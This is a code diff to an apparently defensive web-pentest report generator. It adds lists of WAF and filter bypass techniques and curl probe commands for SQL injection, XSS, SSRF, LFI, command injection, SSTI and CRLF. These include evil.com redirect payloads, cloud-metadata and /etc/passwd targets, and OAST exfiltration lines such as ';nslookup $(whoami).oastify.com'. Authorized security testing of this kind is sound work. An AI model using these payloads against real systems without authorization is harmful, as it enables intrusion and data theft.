@@ -117,6 +117,82 @@ PAYLOADS = {
     "graphql": ["{__schema{types{name}}}", "{__typename}", "query{__schema{queryType{name}}}"],
 }
 
+# ── WAF / filter bypass techniques (per class) ──────────────────────────────
+BYPASS = {
+    "sqli": [
+        "Comment out the rest: `-- -`, `#`, `/**/`, `;%00`",
+        "Split keywords with inline comments: `UN/**/ION SE/**/LECT`, `SEL/*x*/ECT`",
+        "Case toggling: `UnIoN SeLeCt` (defeats naive keyword blocklists)",
+        "Whitespace alternates for a stripped space: `%09 %0a %0c %0d %a0 /**/ +` or `UNION(SELECT(1))`",
+        "Encoding: URL-encode the quote `%27`, or double-encode `%2527` past one decode pass",
+        "Nested keyword so removal reassembles it: `UNIONUNIONSELECTSELECT`",
+    ],
+    "xss": [
+        "When `<script>` is blocked, use an event handler: `<svg onload=...>`, `<img src=x onerror=...>`, `<body onpageshow=...>`",
+        "Obscure handlers that bypass filters: `onpointerover`, `onanimationstart`, `onfocus autofocus`",
+        "No quotes / no parens: `<svg onload=alert`1`>` or `<svg/onload=confirm(1)>`",
+        "Encoding: HTML entities `&lt;`, URL / double-URL, unicode escapes `\\u003c`",
+        "Break the `javascript:` filter: `java%09script:`, `JaVaScRiPt:`, `java\\nscript:`",
+        "Attribute breakout without `>`: `\" autofocus onfocus=alert(1) x=\"`",
+    ],
+    "redirect": [
+        "Scheme/slashes: `//evil.com`, `/\\evil.com`, `https:evil.com`, `%2F%2Fevil.com`",
+        "Confuse the parser with credentials/host: `https://trusted@evil.com`, `https://evil.com#trusted`, `https://evil.com?trusted`",
+        "Allowlist-prefix trick: `https://trusted.evil.com`, `https://evil.com/trusted`",
+    ],
+    "ssrf": [
+        "Alternate IP encodings for `127.0.0.1`: `0177.0.0.1` (octal), `2130706433` (decimal), `127.1`, `[::1]`, `0.0.0.0`",
+        "Allowlist bypass: `trusted.com.evil.com`, `trusted.com@evil.com`, open-redirect chain, DNS rebinding",
+        "Non-HTTP schemes: `gopher://`, `dict://`, `file://`, `http://169.254.169.254` (cloud metadata)",
+    ],
+    "lfi": [
+        "Filtered traversal: `....//`, `..%2f`, `%252e%252e%252f` (double-encode), `..%c0%af`, `..\\/`",
+        "Wrappers / truncation: `php://filter/convert.base64-encode/resource=`, trailing `%00` or long `/.` on old PHP",
+        "Absolute + UNC: `/etc/passwd`, `\\\\attacker\\share` (Windows)",
+    ],
+    "cmdi": [
+        "Separators: `;` `|` `&` `&&` `||` `%0a` (newline), `$(id)`, `` `id` ``",
+        "When spaces are stripped: `${IFS}`, `{cat,/etc/passwd}`, `X=$'\\x20'`",
+        "Blind / no output: exfil via OAST, e.g. `;nslookup $(whoami).oastify.com`",
+    ],
+    "ssti": [
+        "Alternate delimiters if `{{ }}` is filtered: `${...}`, `#{...}`, `<%= %>`, `{%...%}`",
+        "Gadget chains: `{{''.__class__.__mro__}}` (Python), `{{request|attr('application')}}`, concatenate blocked words",
+    ],
+    "crlf": [
+        "Encode the CR/LF: `%0d%0a`, `%0D%0A`, or double-encode `%250d%250a` past one decode",
+        "Unicode/overlong that some servers normalize: `%E5%98%8A%E5%98%8D`",
+    ],
+}
+
+
+def _adv_curl(base: str, param: str, cls: str) -> list[dict]:
+    """Advanced-cURL steps that show cURL doing the whole job for this class:
+    auto-encoding, timing, redirect + header inspection, raw paths."""
+    u = base.rstrip("/")
+
+    def enc(value, desc):
+        return {"desc": desc, "cmd": f"curl -sS -k -G {_sq(u + '/')} --data-urlencode {_sq(param + '=' + value)}"}
+
+    common = [
+        enc("PAYLOAD", "Auto-encode any payload safely (cURL URL-encodes -G data for you)"),
+        {"desc": "Baseline vs probe by size / status / time (spots boolean, error, and time diffs)",
+         "cmd": f"curl -sS -k -o /dev/null -w 'code=%{{http_code}} len=%{{size_download}} t=%{{time_total}}s\\n' {_sq(u + '/?' + param + '=1')}"},
+    ]
+    extra = {
+        "sqli": [enc("1' AND SLEEP(5)-- -", "Time-based check (watch t= jump; cURL times it)")],
+        "xss": [enc('rt"><x>marker', "Reflect a benign marker, then grep the response for rt\"><x>marker")],
+        "ssrf": [enc("http://169.254.169.254/latest/meta-data/", "Aim at cloud metadata / an OAST host; watch for a server-side fetch")],
+        "redirect": [{"desc": "Follow redirects and show where it lands (-i headers, -L follow)",
+                      "cmd": f"curl -sS -k -i -L {_sq(u + '/?' + param + '=//example.com')}"}],
+        "lfi": [{"desc": "Send a raw traversal path unmodified",
+                 "cmd": f"curl -sS -k --path-as-is {_sq(u + '/?' + param + '=../../../../etc/passwd')}"}],
+        "cmdi": [enc(";curl http://YOUR-OAST-ID.oastify.com", "Blind OAST check (watch your collaborator for a callback)")],
+        "crlf": [{"desc": "Inject a header via CRLF, inspect response headers (-i)",
+                  "cmd": f"curl -sS -k -i {_sq(u + '/?' + param + '=1%0d%0aX-Injected:rt')}"}],
+    }
+    return common + extra.get(cls, [])
+
 # ── helpers ─────────────────────────────────────────────────────────────────
 def _conf_label(v: int) -> str:
     return "High" if v >= 70 else ("Medium" if v >= 40 else "Low")
@@ -129,6 +205,17 @@ def _sq(s: str) -> str:
 
 def _gid(*parts: str) -> str:
     return hashlib.sha1("|".join(parts).encode()).hexdigest()[:10]
+
+
+def _curl_first(tools: Optional[list[str]]) -> list[str]:
+    """Advanced cURL can craft essentially any request, so lead every tool list
+    with it. Other tools stay only where cURL genuinely can't reach (a browser
+    for DOM rendering, a collaborator/OAST server, sqlmap for heavy automation)."""
+    t = list(tools or [])
+    if not any(str(x).lower().startswith("curl") for x in t):
+        t = ["curl"] + t
+    t.sort(key=lambda x: 0 if str(x).lower().startswith("curl") else 1)
+    return t
 
 
 def _finding(
@@ -144,6 +231,7 @@ def _finding(
     what: str,
     how: list[str],
     payloads: Optional[list[str]] = None,
+    bypass: Optional[list[str]] = None,
     tools: Optional[list[str]] = None,
     curl_steps: Optional[list[dict]] = None,
     ref_keys: Optional[list[str]] = None,
@@ -166,7 +254,8 @@ def _finding(
         "what_to_test": what,
         "how_to_test": how,
         "payloads": payloads or [],
-        "tools": tools or ["Burp Suite", "curl"],
+        "bypass": bypass or [],
+        "tools": _curl_first(tools),
         "curl_steps": curl_steps or [],
         "references": [{"title": r["t"], "url": r["u"]} for r in refs],
         "tags": tags or [],
@@ -430,21 +519,26 @@ def _param_finding(base: str, cls: str, title: str, category: str, wstg: str, se
     p = PARAMS.get(cls, ["id"])[0]
     example = f"{base}/?{p}={{payload}}"
     steps = [
-        f"Use Burp to map real parameters on {base} (proxy the app, review the site-map & JS).",
+        f"Discover real parameters on {base} with cURL: fetch pages and grep for name=/href query strings "
+        f"(e.g. curl -sS -k {base} | grep -oE '[?&][a-z_]+=' ).",
         f"Common {cls.upper()} parameter names to look for: {', '.join(PARAMS.get(cls, [])[:8])}.",
         *how_extra,
+        "If a filter/WAF blocks the basic payload, apply the bypass techniques below.",
         "Escalate only a confirmed, reproducible case into a PoC with clear impact.",
     ]
     first = PAYLOADS.get(cls, [""])[0]
     curl = [
         {"desc": "Baseline (record normal response length/timing)", "cmd": f"curl -sS -k -o /dev/null -w 'len=%{{size_download}} time=%{{time_total}}s\\n' {_sq(base + '/?' + p + '=1')}"},
         {"desc": f"Probe with a {cls.upper()} marker", "cmd": f"curl -sS -k {_sq(base + '/?' + p + '=' + first)}"},
-    ]
+    ] + _adv_curl(base, p, cls)
+    # cURL handles the request-crafting, so drop generic "Burp Suite" here; keep
+    # specialist tools cURL can't replace (Collaborator/OAST, a browser, sqlmap).
+    tools = [t for t in tools if "burp suite" not in t.lower()]
     return _finding(
         key=f"param-{cls}", title=title, category=category, wstg=wstg, severity=severity,
         confidence=confidence, surface=example,
         evidence=f"Live application at {base}; parameter-driven {cls.upper()} surface (apply to real params).",
-        what=what, how=steps, payloads=PAYLOADS.get(cls, []), tools=tools,
+        what=what, how=steps, payloads=PAYLOADS.get(cls, []), bypass=BYPASS.get(cls, []), tools=tools,
         curl_steps=curl, ref_keys=ref_keys, tags=tags,
     )
 
